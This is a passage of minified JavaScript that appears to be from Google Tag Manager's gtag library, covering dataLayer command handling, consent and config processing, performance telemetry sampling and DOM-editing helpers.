    var n = ed(m);
    Q(24) && $p(m.id, m.name);
    f && (n = Ks(n));
    if (Q(24)) {}
    var p = Es(n, m),
      q = !1;
    Er(m.Tb);
    "gtm.js" !== d && "gtm.sync" !== d || Lr(tg());
    return Ls(n, p) || q;
  };
  function Js(a) {
    return function (b) {
      Za(b) || $r(a, "input", b);
    };
  }
  function Is() {
    var a = {};
    a.event = bf("event", 1);
    a.ecommerce = bf("ecommerce", 1);
    a.gtm = bf("gtm");
    a.eventModel = bf("eventModel");
    return a;
  }
  function Ks(a) {
    for (var b = [], c = 0; c < a.length; c++) if (a[c]) {
      var d = String(Pc[c][oc.ma]);
      if (Ae[d] || void 0 !== Pc[c][oc.Zj] || Re[d] || Cq(d, 2)) b[c] = !0;
    }
    return b;
  }
  function Ls(a, b) {
    if (!b) return b;
    for (var c = 0; c < a.length; c++) if (a[c] && Pc[c] && !Be[String(Pc[c][oc.ma])]) return !0;
    return !1;
  }
  var Ns = {},
    Os = {},
    Ps = function (a, b) {
      for (var c = [], d = [], e = {}, f = 0; f < a.length; e = {
        Ve: e.Ve,
        Pe: e.Pe
      }, f++) {
        var h = a[f];
        if (0 <= h.indexOf("-")) {
          if (e.Ve = ll(h, b), e.Ve) {
            var l = rg();
            ya(l, function (t) {
              return function (r) {
                return t.Ve.aa === r;
              };
            }(e)) ? c.push(h) : d.push(h);
          }
        } else {
          var m = Ns[h] || [];
          e.Pe = {};
          m.forEach(function (t) {
            return function (r) {
              return t.Pe[r] = !0;
            };
          }(e));
          for (var n = pg(), p = 0; p < n.length; p++) if (e.Pe[n[p]]) {
            c = c.concat(rg());
            break;
          }
          var q = Os[h] || [];
          q.length && (c = c.concat(q));
        }
      }
      return {
        Dl: c,
        Fl: d
      };
    },
    Qs = function (a) {
      k(Ns, function (b, c) {
        var d = c.indexOf(a);
        0 <= d && c.splice(d, 1);
      });
    },
    Rs = function (a) {
      k(Os, function (b, c) {
        var d = c.indexOf(a);
        0 <= d && c.splice(d, 1);
      });
    };
  var Ss = "HA GF G UA AW DC MC".split(" "),
    Ts = !1,
    Us = !1;
  function Vs(a, b) {
    a.hasOwnProperty("gtm.uniqueEventId") || Object.defineProperty(a, "gtm.uniqueEventId", {
      value: Se()
    });
    b.eventId = a["gtm.uniqueEventId"];
    b.priorityId = a["gtm.priorityId"];
    return {
      eventId: b.eventId,
      priorityId: b.priorityId
    };
  }
  var Ws = void 0,
    Xs = void 0;
  function Ys(a, b, c) {
    var d = z(a);
    d.eventId = void 0;
    d.inheritParentConfig = void 0;
    Object.keys(b).some(function (f) {
      return void 0 !== b[f];
    }) && K(136);
    var e = z(b);
    z(c, e);
    qs(ms(pg()[0], e), a.eventId, d);
  }
  function Zs(a) {
    for (var b = ha([L.g.Zc, L.g.Pb]), c = b.next(); !c.done; c = b.next()) {
      var d = c.value,
        e = a && a[d] || dm.D[d];
      if (e) return e;
    }
  }
  var $s = {
      config: function (a, b) {
        var c = Q(45),
          d = Vs(a, b);
        if (!(2 > a.length) && g(a[1])) {
          var e = {};
          if (2 < a.length) {
            if (void 0 != a[2] && !Ya(a[2]) || 3 < a.length) return;
            e = a[2];
          }
          var f = ll(a[1], b.isGtmEvent);
          if (f) {
            var h, l, m;
            a: {
              if (!kg.nd) {
                var n = vg(Bg());
                if (Fg(n)) {
                  var p = n.parent,
                    q = p.isDestination;
                  m = {
                    Jl: vg(p),
                    Cl: q
                  };
                  break a;
                }
              }
              m = void 0;
            }
            var t = m;
            t && (h = t.Jl, l = t.Cl);
            Tr(d.eventId, "gtag.config");
            var r = f.aa,
              u = f.id !== r;
            if (u ? -1 === rg().indexOf(r) : -1 === pg().indexOf(r)) {
              if (!(c && b.inheritParentConfig || e[L.g.sb])) {
                var v = Zs(e);
                if (u) Qq(r, v, {
                  source: 2,
                  fromContainerExecution: b.fromContainerExecution
                });else if (c && void 0 !== h && -1 !== h.containers.indexOf(r)) {
                  var w = e;
                  Ws ? Ys(b, w, Ws) : Xs || (Xs = z(w));
                } else Pq(r, v, !0, {
                  source: 2,
                  fromContainerExecution: b.fromContainerExecution
                });
              }
            } else {
              if (h && (K(128), l && K(130), c && b.inheritParentConfig)) {
                var x;
                var y = e;
                Xs ? (Ys(b, Xs, y), x = !1) : (!y[L.g.Qb] && De && Ws || (Ws = z(y)), x = !0);
                x && h.containers && h.containers.join(",");
                return;
              }
              if (De && !u && !e[L.g.Qb]) {
                var A = Us;
                Us = !0;
                if (A) return;
              }
              Ts || K(43);
              if (!b.noTargetGroup) if (u) {
                Rs(f.id);
                var B = f.id,
                  D = e[L.g.ne] || "default";
                D = String(D).split(",");
                for (var I = 0; I < D.length; I++) {
                  var J = Os[D[I]] || [];
                  Os[D[I]] = J;
                  0 > J.indexOf(B) && J.push(B);
                }
              } else {
                Qs(f.id);
                var E = f.id,
                  G = e[L.g.ne] || "default";
                G = G.toString().split(",");
                for (var M = 0; M < G.length; M++) {
                  var P = Ns[G[M]] || [];
                  Ns[G[M]] = P;
                  0 > P.indexOf(E) && P.push(E);
                }
              }
              delete e[L.g.ne];
              var ba = b.eventMetadata || {};
              ba.hasOwnProperty("is_external_event") || (ba.is_external_event = !b.fromContainerExecution);
              b.eventMetadata = ba;
              delete e[L.g.Tc];
              for (var S = u ? [f.id] : rg(), O = 0; O < S.length; O++) {
                var ca = e,
                  Z = z(b),
                  U = ll(S[O], Z.isGtmEvent);
                U && dm.push("config", [ca], U, Z);
              }
            }
          }
        }
      },
      consent: function (a, b) {
        if (3 === a.length) {
          K(39);
          var c = Vs(a, b),
            d = a[1],
            e = a[2];
          b.fromContainerExecution || (e[L.g.N] && K(139), e[L.g.ya] && K(140));
          "default" === d ? Zf(e) : "update" === d ? $f(e, c) : "declare" === d ? b.fromContainerExecution && Yf(e) : Q(81) && "core_platform_services" === d && ag(e);
        }
      },
      event: function (a, b) {
        var c = a[1];
        if (!(2 > a.length) && g(c)) {
          var d;
          if (2 < a.length) {
            if (!Ya(a[2]) && void 0 != a[2] || 3 < a.length) return;
            d = a[2];
          }
          var e = d,
            f = {},
            h = (f.event = c, f);
          e && (h.eventModel = z(e), e[L.g.Tc] && (h.eventCallback = e[L.g.Tc]), e[L.g.he] && (h.eventTimeout = e[L.g.he]));
          var l = Vs(a, b),
            m = l.eventId,
            n = l.priorityId;
          h["gtm.uniqueEventId"] = m;
          n && (h["gtm.priorityId"] = n);
          if ("optimize.callback" === c) return h.eventModel = h.eventModel || {}, h;
          var p;
          var q = d,
            t = q && q[L.g.Ob];
          void 0 === t && (t = Ye(L.g.Ob, 2), void 0 === t && (t = "default"));
          if (g(t) || xa(t)) {
            var r;
            b.isGtmEvent ? r = g(t) ? [t] : t : r = t.toString().replace(/\s+/g, "").split(",");
            var u = Ps(r, b.isGtmEvent),
              v = u.Dl,
              w = u.Fl;
            if (w.length) for (var x = Zs(q), y = 0; y < w.length; y++) {
              var A = ll(w[y], b.isGtmEvent);
              A && Qq(A.aa, x, {
                source: 3,
                fromContainerExecution: b.fromContainerExecution
              });
            }
            p = nl(v, b.isGtmEvent);
          } else p = void 0;
          var B = p;
          if (B) {
            Tr(m, c);
            for (var D = [], I = 0; I < B.length; I++) {
              var J = B[I],
                E = z(b);
              if (-1 !== Ss.indexOf(wg(J.prefix))) {
                var G = z(d),
                  M = E.eventMetadata || {};
                M.hasOwnProperty("is_external_event") || (M.is_external_event = !E.fromContainerExecution);
                E.eventMetadata = M;
                delete G[L.g.Tc];
                em(c, G, J.id, E);
              }
              D.push(J.id);
            }
            h.eventModel = h.eventModel || {};
            0 < B.length ? h.eventModel[L.g.Ob] = D.join() : delete h.eventModel[L.g.Ob];
            Ts || K(43);
            void 0 === b.noGtmEvent && b.eventMetadata && b.eventMetadata.syn_or_mod && (b.noGtmEvent = !0);
            h.eventModel[L.g.rb] && (b.noGtmEvent = !0);
            return b.noGtmEvent ? void 0 : h;
          }
        }
      },
      get: function (a, b) {
        K(53);
        if (4 === a.length && g(a[1]) && g(a[2]) && ua(a[3])) {
          var c = ll(a[1], b.isGtmEvent),
            d = String(a[2]),
            e = a[3];
          if (c) {
            Ts || K(43);
            var f = Zs();
            if (!ya(rg(), function (l) {
              return c.aa === l;
            })) Qq(c.aa, f, {
              source: 4,
              fromContainerExecution: b.fromContainerExecution
            });else if (-1 !== Ss.indexOf(wg(c.prefix))) {
              Vs(a, b);
              var h = {};
              Vf(z((h[L.g.cb] = d, h[L.g.pb] = e, h)));
              fm(d, function (l) {
                H(function () {
                  return e(l);
                });
              }, c.id, b);
            }
          }
        }
      },
      js: function (a, b) {
        if (2 == a.length && a[1].getTime) {
          Ts = !0;
          var c = Vs(a, b),
            d = c.eventId,
            e = c.priorityId,
            f = {};
          return f.event = "gtm.js", f["gtm.start"] = a[1].getTime(), f["gtm.uniqueEventId"] = d, f["gtm.priorityId"] = e, f;
        }
      },
      policy: function () {},
      set: function (a, b) {
        var c;
        2 == a.length && Ya(a[1]) ? c = z(a[1]) : 3 == a.length && g(a[1]) && (c = {}, Ya(a[2]) || xa(a[2]) ? c[a[1]] = z(a[2]) : c[a[1]] = a[2]);
        if (c) {
          var d = Vs(a, b),
            e = d.eventId,
            f = d.priorityId;
          z(c);
          var h = z(c);
          dm.push("set", [h], void 0, b);
          c["gtm.uniqueEventId"] = e;
          f && (c["gtm.priorityId"] = f);
          Q(13) && delete c.event;
          b.overwriteModelFields = !0;
          return c;
        }
      }
    },
    at = {
      policy: !0
    };
  var bt = function (a) {
      var b = C[xe.ba].hide;
      if (b && void 0 !== b[a] && b.end) {
        b[a] = !1;
        var c = !0,
          d;
        for (d in b) if (b.hasOwnProperty(d) && !0 === b[d]) {
          c = !1;
          break;
        }
        c && (b.end(), b.end = null);
      }
    },
    ct = function (a) {
      var b = C[xe.ba],
        c = b && b.hide;
      c && c.end && (c[a] = !0);
    };
  var dt = !1,
    et = [];
  function ft() {
    if (!dt) {
      dt = !0;
      for (var a = 0; a < et.length; a++) H(et[a]);
    }
  }
  var gt = function (a) {
    dt ? H(a) : et.push(a);
  };
  var pt = function () {
      try {
        var a, b;
        var c = C[Gr()],
          d = "";
        "" == d && (d = "t0");
        b = "ga";
        try {
          var e = c && c.getByName && c.getByName(d);
          if (e) {
            0 === d.indexOf("gtag_") ? b = "gtag" : e.get("&gtm") && (b = "gtm");
            for (var f in c) if (c.hasOwnProperty(f)) {
              var h = c[f];
              if ("l" !== f && "answer" !== f && "number" === typeof h) {
                var l = ht - h;
                1E5 > l && 0 < l && (a = l);
              }
            }
          }
        } catch (D) {}
        var m,
          n = tg(),
          p = Gd('script[src*="gtm/js?id=' + n + '"],script[src*="optimize.js?id=' + n + '"]');
        m = p && 0 < p.length ? p[0] : null;
        b || (b = "gaoo");
        var q = it(jt, m && m.src),
          t = q.Pd,
          r = q.Qd,
          u = q.We,
          v = q.Xe,
          w = q.Me,
          x = q.ef,
          y = q.Bd,
          A = q.Xf,
          B = q.Ad;
        "h0" != y || kt || (y = "h3");
        lt = {
          Bd: y,
          Ad: B,
          Ik: a,
          Al: b,
          Xf: A,
          Xe: v,
          Me: w,
          ef: x,
          We: u,
          Pd: t,
          Qd: r,
          gi: mt,
          Hi: nt
        };
        ot(lt);
      } catch (D) {}
    },
    qt = function () {
      var a = C.gaData,
        b = 0,
        c = void 0;
      if (a) for (var d in a) if (a.hasOwnProperty(d) && 0 === d.indexOf("UA-") && a[d].hitcount) {
        b += a[d].hitcount;
        var e = Number(a[d].first_hit);
        e && (!c || e < c) && (c = e);
      }
      return {
        hi: b,
        ei: c
      };
    },
    it = function (a, b) {
      var c, d, e, f, h, l, m, n, p;
      var q = C.performance;
      if (q) {
        if (b) {
          var t = q.getEntriesByName(b)[0];
          if (t) {
            var r = q.getEntriesByType("resource"),
              u = 0;
            r && 0 < r.length && (u = r[0].startTime);
            f = Math.round(t.startTime - u);
            h = Math.round(t.duration);
            e = r.indexOf(t);
            -1 === e && (e = void 0);
            l = Math.round(a - (t.startTime + t.duration));
          }
        }
        var v = q.timing;
        if (v.domContentLoadedEventStart) {
          var w = v.domContentLoadedEventStart - v.navigationStart;
          w && (d = Math.round(a - w));
        }
        var x = q.getEntriesByType("paint").filter(function (D) {
          return "first-contentful-paint" === D.name;
        })[0];
        x && (c = Math.round(a - x.startTime));
      }
      var y = C[xe.ba].hide;
      if (y) {
        if (void 0 === y[tg()]) m = "h2";else {
          var A = !1;
          if (null === y.end) for (var B in y) if (y.hasOwnProperty(B) && Pa(B, tg()) && !0 === y[B]) {
            A = !0;
            break;
          }
          m = A ? "h0" : "h1";
        }
        y.start && !isNaN(y.start) && (q ? q.timing && (p = Math.round(a + q.timing.navigationStart - y.start)) : p = a - y.start);
        isNaN(y.timeout) || (n = y.timeout);
      }
      return {
        Pd: d,
        Qd: c,
        We: e,
        Xe: f,
        Me: h,
        ef: l,
        Bd: m,
        Xf: n,
        Ad: p
      };
    },
    ot = function (a, b) {
      b = void 0 === b ? "ol" : b;
      var c = function (e, f) {
          null != f && (d += e + encodeURIComponent(f));
        },
        d = Og + "&cv=1043";
      c("&t=", b);
      c("&s=", a.Bd);
      c("&h=", a.Ad);
      c("&g=", a.Ik);
      c("&p=", a.Al);
      c("&o=", a.Xf);
      c("&l=", function () {
        var e = Ne;
        return e ? ht - Ea(e) : void 0;
      }());
      c("&q=", a.Xe);
      c("&f=", a.Me);
      c("&e=", a.ef);
      c("&i=", a.We);
      c("&d=", a.Pd);
      c("&c=", a.Qd);
      c("&tr=", a.km);
      c("&jl=", a.yl);
      c("&jf=", a.wl);
      c("&ji=", a.xl);
      c("&jq=", a.zl);
      c("&jd=", a.sl);
      c("&jx=", a.vl);
      c("&hc=", a.gi);
      c("&fh=", a.Hi);
      d += "&sr=0.050000";
      c("&ps=", rt);
      c("&cb=", za());
      $b(d);
    },
    st = !1,
    ht,
    jt,
    kt,
    rt,
    lt,
    mt,
    nt;
  rt = Math.random(), st = "0.050000" > rt;
  var tt = function () {
      if (!st || ht) return;
      ht = Ka();
      jt = jc() || ht;
      kt = !!F.querySelector("body");
      var a = qt(),
        b = a.ei;
      mt = a.hi;
      nt = b ? ht - b : void 0;
      gt(pt);
    },
    vt = function (a) {
      var b = ut;
      if (!st) return;
      try {
        var c = Ka(),
          d = jc() || c,
          e = qt(),
          f = e.hi,
          h = e.ei,
          l = h ? c - h : void 0;
        gt(function () {
          var m = it(d, b),
            n = m.Pd,
            p = m.Qd,
            q = m.We,
            t = m.Xe,
            r = m.Me,
            u = m.ef,
            v = m.Bd,
            w = m.Ad,
            x = z(lt || {});
          z(a, x);
          z({
            Bd: v,
            Ad: w,
            Pd: n,
            Qd: p,
            xl: q,
            zl: t,
            sl: r,
            vl: u,
            gi: f,
            Hi: l
          }, x);
          ot(x, "od");
        });
      } catch (m) {}
    };
  var xt = function (a) {
    if (wt(a)) return a;
    this.h = a;
  };
  xt.prototype.getUntrustedMessageValue = function () {
    return this.h;
  };
  var wt = function (a) {
    return !a || "object" !== Va(a) || Ya(a) ? !1 : "getUntrustedMessageValue" in a;
  };
  xt.prototype.getUntrustedMessageValue = xt.prototype.getUntrustedMessageValue;
  var zt = 0,
    At = {},
    Bt = [],
    Ct = [],
    Dt = !1,
    Et = !1;
  function Ft(a, b) {
    return a.messageContext.eventId - b.messageContext.eventId || a.messageContext.priorityId - b.messageContext.priorityId;
  }
  var Gt = function (a) {
      return C[xe.ba].push(a);
    },
    Ht = function (a, b) {
      if (!va(b) || 0 > b) b = 0;
      var c = ye[xe.ba],
        d = 0,
        e = !1,
        f = void 0;
      f = C.setTimeout(function () {
        e || (e = !0, a());
        f = void 0;
      }, b);
      return function () {
        var h = c ? c.subscribers : 1;
        ++d === h && (f && (C.clearTimeout(f), f = void 0), e || (a(), e = !0));
      };
    };
  function It(a, b) {
    var c = a._clear || b.overwriteModelFields;
    k(a, function (e, f) {
      "_clear" !== e && (c && af(e), af(e, f));
    });
    Ne || (Ne = a["gtm.start"]);
    tt();
    var d = a["gtm.uniqueEventId"];
    if (!a.event) return !1;
    "number" !== typeof d && (d = Se(), a["gtm.uniqueEventId"] = d, af("gtm.uniqueEventId", d));
    return Ms(a);
  }
  function Jt(a) {
    if (null == a || "object" !== typeof a) return !1;
    if (a.event) return !0;
    if (Da(a)) {
      var b = a[0];
      if ("config" === b || "event" === b || "js" === b || "get" === b) return !0;
    }
    return !1;
  }
  function Kt() {
    var a;
    if (Ct.length) a = Ct.shift();else if (Bt.length) a = Bt.shift();else return;
    var b;
    var c = a;
    if (Dt || !Jt(c.message)) b = c;else {
      Dt = !0;
      var d = c.message["gtm.uniqueEventId"];
      "number" !== typeof d && (d = c.message["gtm.uniqueEventId"] = Se());
      var e = {},
        f = {
          message: (e.event = "gtm.init_consent", e["gtm.uniqueEventId"] = d - 2, e),
          messageContext: {
            eventId: d - 2
          }
        },
        h = {},
        l = {
          message: (h.event = "gtm.init", h["gtm.uniqueEventId"] = d - 1, h),
          messageContext: {
            eventId: d - 1
          }
        };
      Bt.unshift(l, c);
      if (Ng) {
        var m = mg.ctid;
        if (m) {
          var n,
            p = vg(Bg());
          n = p && p.context;
          var q,
            t = Aj(C.location.href);
          q = t.hostname + t.pathname;
          var r = n && n.fromContainerExecution,
            u = n && n.source,
            v = mg.He,
            w = kg.nd;
          Ng && (Pl || (Pl = q), Ql.push(m + ";" + v + ";" + (r ? 1 : 0) + ";" + (u || 0) + ";" + (w ? 1 : 0)));
        }
      }
      b = f;
    }
    return b;
  }
  function Lt() {
    for (var a = !1, b; !Et && (b = Kt());) {
      Et = !0;
      delete Ve.eventModel;
      Xe();
      var c = b,
        d = c.message,
        e = c.messageContext;
      if (null == d) Et = !1;else {
        if (e.fromContainerExecution) for (var f = ["gtm.allowlist", "gtm.blocklist", "gtm.whitelist", "gtm.blacklist", "tagTypeBlacklist"], h = 0; h < f.length; h++) {
          var l = f[h],
            m = Ye(l, 1);
          if (xa(m) || Ya(m)) m = z(m);
          We[l] = m;
        }
        try {
          if (ua(d)) try {
            d.call(Ze);
          } catch (D) {} else if (xa(d)) {
            var n = d;
            if (g(n[0])) {
              var p = n[0].split("."),
                q = p.pop(),
                t = n.slice(1),
                r = Ye(p.join("."), 2);
              if (null != r) try {
                r[q].apply(r, t);
              } catch (D) {}
            }
          } else {
            var u = void 0,
              v = !1;
            if (Da(d)) {
              a: {
                if (d.length && g(d[0])) {
                  var w = $s[d[0]];
                  if (w && (!e.fromContainerExecution || !at[d[0]])) {
                    u = w(d, e);
                    break a;
                  }
                }
                u = void 0;
              }
              (v = u && "set" === d[0] && !!u.event) && K(101);
            } else u = d;
            if (u) {
              var x = It(u, e);
              a = x || a;
              v && x && K(113);
            }
          }
        } finally {
          e.fromContainerExecution && Xe(!0);
          var y = d["gtm.uniqueEventId"];
          if ("number" === typeof y) {
            for (var A = At[String(y)] || [], B = 0; B < A.length; B++) Ct.push(Mt(A[B]));
            A.length && Ct.sort(Ft);
            delete At[String(y)];
            y > zt && (zt = y);
          }
          Et = !1;
        }
      }
    }
    return !a;
  }
  function Nt() {
    if (Q(24)) {
      var a = Ot();
    }
    var b = Lt();
    if (Q(24)) {}
    try {
      bt(tg());
    } catch (c) {}
    return b;
  }
  function rs(a) {
    if (zt < a.notBeforeEventId) {
      var b = String(a.notBeforeEventId);
      At[b] = At[b] || [];
      At[b].push(a);
    } else Ct.push(Mt(a)), Ct.sort(Ft), H(function () {
      Et || Lt();
    });
  }
  function Mt(a) {
    return {
      message: a.message,
      messageContext: a.messageContext
    };
  }
  var Pt = function () {
      function a(f) {
        var h = {};
        if (wt(f)) {
          var l = f;
          f = wt(l) ? l.getUntrustedMessageValue() : void 0;
          h.fromContainerExecution = !0;
        }
        return {
          message: f,
          messageContext: h
        };
      }
      var b = Sb(xe.ba, []),
        c = ye[xe.ba] = ye[xe.ba] || {};
      !0 === c.pruned && K(83);
      At = ps().get();
      ss();
      vr(function () {
        if (!c.gtmDom) {
          c.gtmDom = !0;
          var f = {};
          b.push((f.event = "gtm.dom", f));
        }
      });
      gt(function () {
        if (!c.gtmLoad) {
          c.gtmLoad = !0;
          var f = {};
          b.push((f.event = "gtm.load", f));
        }
      });
      c.subscribers = (c.subscribers || 0) + 1;
      var d = b.push;
      b.push = function () {
        var f;
        if (0 < ye.SANDBOXED_JS_SEMAPHORE) {
          f = [];
          for (var h = 0; h < arguments.length; h++) f[h] = new xt(arguments[h]);
        } else f = [].slice.call(arguments, 0);
        var l = f.map(function (q) {
          return a(q);
        });
        Bt.push.apply(Bt, l);
        var m = d.apply(b, f),
          n = Math.max(100, Number("1000") || 300);
        if (this.length > n) for (K(4), c.pruned = !0; this.length > n;) this.shift();
        var p = "boolean" !== typeof m || m;
        return Lt() && p;
      };
      var e = b.slice(0).map(function (f) {
        return a(f);
      });
      Bt.push.apply(Bt, e);
      if (Ot()) {
        if (Q(24)) {}
        H(Nt);
      }
    },
    Ot = function () {
      var a = !0;
      return a;
    };
  function Qt(a) {
    if (null == a || 0 === a.length) return !1;
    var b = Number(a),
      c = Ka();
    return b < c + 3E5 && b > c - 9E5;
  }
  function Rt(a) {
    return a && 0 === a.indexOf("pending:") ? Qt(a.substr(8)) : !1;
  }
  ;
  var lu = function () {};
  var mu = function () {};
  mu.prototype.toString = function () {
    return "undefined";
  };
  var nu = new mu();
  var Su = C.clearTimeout,
    Tu = C.setTimeout,
    V = function (a, b, c, d) {
      if (aj()) {
        b && H(b);
      } else return Xb(a, b, c, d);
    },
    Uu = function () {
      return new Date();
    },
    Vu = function () {
      return C.location.href;
    },
    Wu = function (a) {
      return yj(Aj(a), "fragment");
    },
    Xu = function (a) {
      return zj(Aj(a));
    },
    Yu = function (a, b) {
      return Ye(a, b || 2);
    },
    Zu = function (a, b, c) {
      var d;
      b ? (a.eventCallback = b, c && (a.eventTimeout = c), d = Gt(a)) : d = Gt(a);
      return d;
    },
    $u = function (a, b) {
      C[a] = b;
    },
    W = function (a, b, c) {
      b && (void 0 === C[a] || c && !C[a]) && (C[a] = b);
      return C[a];
    },
    av = function (a, b, c) {
      return Ii(a, b, void 0 === c ? !0 : !!c);
    },
    bv = function (a, b, c) {
      return 0 === Ri(a, b, c);
    },
    cv = function (a, b) {
      if (aj()) {
        b && H(b);
      } else Zb(a, b);
    },
    dv = function (a) {
      return !!yu(a, "init", !1);
    },
    ev = function (a) {
      wu(a, "init", !0);
    },
    fv = function (a, b, c) {
      Za(a) || $r(c, b, a);
    };
  var gv = function (a) {
      if (!a || a.nodeType != Node.ELEMENT_NODE) return !1;
      var b = a.tagName.toUpperCase();
      return "SCRIPT" == b || "STYLE" == b || "LINK" == b;
    },
    hv = function (a, b, c) {
      try {
        null == c ? a.removeAttribute(b) : a.setAttribute(b, c);
      } catch (d) {
        return d;
      }
      return null;
    },
    iv = function (a, b, c) {
      var d = a.getAttribute(b);
      return hv(a, b, c) ? 8 : function () {
        hv(a, b, d);
      };
    },
    lv = function (a, b, c) {
      var d,
        e,
        f = a.ownerDocument || a.document || document;
      c = (c || "").toLowerCase();
      "after" == c ? (d = a.parentNode, e = a.nextSibling) : "insert" == c ? (d = a, e = a.firstChild) : "append" == c ? (d = a, e = null) : (d = a.parentNode, e = a);
      if (!d || d == f) return {
        result: 1,
        kl: []
      };
      var h = jv(b, d);
      kv(h, "SCRIPT");
      kv(h, "NOSCRIPT");
      var l = [];
      if (h.firstChild) for (var m = h.firstChild; m;) {
        var n = m.nextSibling;
        l.push(m);
        d.insertBefore(m, e);
        m = n;
      }
      var p = a.nextSibling;
      "replace" == c && d.removeChild(a);
      return {
        result: function () {
          for (; 0 < l.length;) d.removeChild(l.pop());
          "replace" == c && d.insertBefore(a, p);
        },
        kl: l.slice()
      };
    },
    mv = {
      SELECT: [1, '<select multiple="multiple">', "</select>"],
      FIELDSET: [1, "<fieldset>", "</fieldset>"],
      MAP: [1, "<map>", "</map>"],
      OBJECT: [1, "<object>", "</object>"],
      TABLE: [1, "<table>", "</table>"],
      TBODY: [2, "<table><tbody>", "</tbody></table>"],
      COLGROUP: [2, "<table><colgroup>", "</colgroup></table>"],
      TR: [3, "<table><tbody><tr>", "</tr></tbody></table>"]
    },
    jv = function (a, b) {
      var c = 0,
        d = "",
        e = "",
        f = mv[b.tagName];
      null != f && (c = f[0], d = f[1], e = f[2]);
      var h = b.ownerDocument.createElement("div"),
        l = Ob(d + (a || "") + e);
      1 === h.nodeType && Mb(h);
      h.innerHTML = Fb(l);
      for (var m = h; 0 < c;) {
        var n = m.firstChild;
        if (null == n.firstChild) return b.ownerDocument.createElement("div");
        m = n;
        c--;
      }
      return m;
    },
    kv = function (a, b) {
      for (var c = a.getElementsByTagName(b), d = [], e = c.length - 1; 0 <= e; e--) {
        var f = c[e];
        f.parentNode.removeChild(f);
        d.push(f);
      }
    },
    nv = function (a) {
      var b = null,
        c = null;
      try {
        b = new Function("element", a);
      } catch (d) {
        c = d;
      }
      return {
        Tf: b,
        error: c
      };
    },
    rv = function (a, b, c, d, e) {
      var f = a + "{" + (b + ": " + c + (d ? " !important" : "")) + "}";
      e && (f = e + "{" + f + "}");
      var h = document;
      if (h.createStyleSheet) {
        var l = ov(h),
          m = l.rules.length;
        l.insertRule(f, m);
        return function () {
          l.deleteRule ? l.deleteRule(m) : l.removeRule(m);
          l.insertRule("x {}", m);
        };
      }
      var n = pv(f, h);
      qv(n, h);
      var p = n.parentNode;
      return function () {
        p.removeChild(n);
      };
    },
    sv = null,
    ov = function (a) {
      if (sv) return sv;
      for (var b = a.styleSheets.length - 1; 0 <= b; b--) {
        var c = a.styleSheets[b];
        if (!c.href) {
          var d = c.ownerNode;
          if (d && d.parentNode && "HEAD" == d.parentNode.tagName) return sv = c;
        }
      }
      0 == a.styleSheets.length && a.createStyleSheet();
      return sv = a.styleSheets[0];
    },
    pv = function (a, b) {
      var c = (b || document).createElement("style");
      void 0 !== c.cssText ? c.cssText = a : c.innerHTML = a;
      return c;
    },
    qv = function (a, b) {
      var c = b || document,
        d = c.getElementsByTagName("head")[0];
      d || (d = c.createElement("head"), c.body.parentNode.insertBefore(d, c.body));
      d.appendChild(a);
    },
    tv = function (a, b, c, d) {
      if (a.style.setProperty) try {
        var e = a.style.getPropertyValue(b),
          f = a.style.getPropertyPriority(b);
        a.style.setProperty(b, c, d ? "important" : "");
        return function () {
          a.style.setProperty(b, "", f);
          a.style.setProperty(b, e, f);
        };
      } catch (l) {}
      var h = a.style.cssText;
      a.style.cssText += ";" + (b + ": " + c + (d ? " !important" : "")) + ";";
      return function () {
        a.style.cssText = h;
      };
    },
    vv = function (a, b, c, d) {
      if (gv(a)) return 7;
      if (b) return uv(a, b, d);
      if (c && c.parentNode) {
        var e = a.parentNode,
          f = a.nextSibling;
        try {
          c.parentNode.insertBefore(a, c.nextSibling);
        } catch (h) {
          return 9;
        }
        return function () {
          e.insertBefore(a, f);
        };
      }
      return 4;
    },
    uv = function (a, b, c) {
      var d = a.parentNode,
        e = a.nextSibling;
      c = (c || "").toLowerCase();
      try {
        if ("bottom" == c) b.appendChild(a);else if ("top" == c) b.insertBefore(a, b.childNodes[0] || null);else if ("before" == c) {
          if (b.parentNode) b.parentNode.insertBefore(a, b);else return 5;
        } else if ("after" == c) if (b.parentNode) b.parentNode.insertBefore(a, b.nextSibling);else return 5;
      } catch (f) {
        return 9;
      }
      return function () {
        try {
          d.insertBefore(a, e);
        } catch (f) {}
      };
    },
    wv = function (a, b, c) {
      if (0 <= b && b < a.childNodes.length) {
        var d = a.childNodes[b];
        if (null != d && d.nodeType == Node.TEXT_NODE) {
          var e = d.nodeValue;
          d.nodeValue = c;
          return function () {
            d.nodeValue = e;
          };
        }
        return 2;
      }
      return 3;
    },
    xv = function (a, b, c, d) {
      c ? d = c.nextSibling : d && (c = d.previousSibling);
      if (null != c && c.nodeType == Node.TEXT_NODE) {
        var e = c.nodeValue;
        c.nodeValue += a;
        return function () {
          c.nodeValue = e;
        };
      }
      if (null != d && d.nodeType == Node.TEXT_NODE) {
        var f = d.nodeValue;
        d.nodeValue = a + d.nodeValue;
        return function () {
          d.nodeValue = f;
        };
      }
      var h = (b.ownerDocument || b.document || document).createTextNode(a);
      d ? b.insertBefore(h, d) : b.appendChild(h);
      return function () {
        b.removeChild(h);
      };
    },
    yv = function (a) {
      var b = document.createElement("a");
      a && (b.href = a);
      return b;
    };
  function Cv(a, b) {
    function c(h) {
      var l = Aj(h),
        m = yj(l, "protocol"),
        n = yj(l, "host", !0),
        p = yj(l, "port"),
        q = yj(l, "path").toLowerCase().replace(/\/$/, "");
      if (void 0 === m || "http" === m && "80" === p || "https" === m && "443" === p) m = "web", p = "default";
      return [m, n, p, q];
    }
    for (var d = c(String(a)), e = c(String(b)), f = 0; f < d.length; f++) if (d[f] !== e[f]) return !1;
    return !0;
  }
  function Dv(a) {
    return Ev(a) ? 1 : 0;
  }
  function Ev(a) {
    var b = a.arg0,
      c = a.arg1;
    if (a.any_of && Array.isArray(c)) {
      for (var d = 0; d < c.length; d++) {
        var e = z(a, {});
        z({
          arg1: c[d],
          any_of: void 0
        }, e);
        if (Dv(e)) return !0;
      }
      return !1;
    }
    switch (a["function"]) {
      case "_cn":
        return 0 <= String(b).indexOf(String(c));
      case "_css":
        var f;
        a: {
          if (b) try {
            for (var h = 0; h < vd.length; h++) {
              var l = vd[h];
              if (b[l]) {
                f = b[l](c);
                break a;
              }
            }
          } catch (v) {}
          f = !1;
        }
        return f;
      case "_ew":
        var m, n;
        m = String(b);
        n = String(c);
        var p = m.length - n.length;
        return 0 <= p && m.indexOf(n, p) === p;
      case "_eq":
        return String(b) === String(c);
      case "_ge":
        return Number(b) >= Number(c);
      case "_gt":
        return Number(b) > Number(c);
      case "_lc":
        return 0 <= String(b).split(",").indexOf(String(c));
      case "_le":
        return Number(b) <= Number(c);
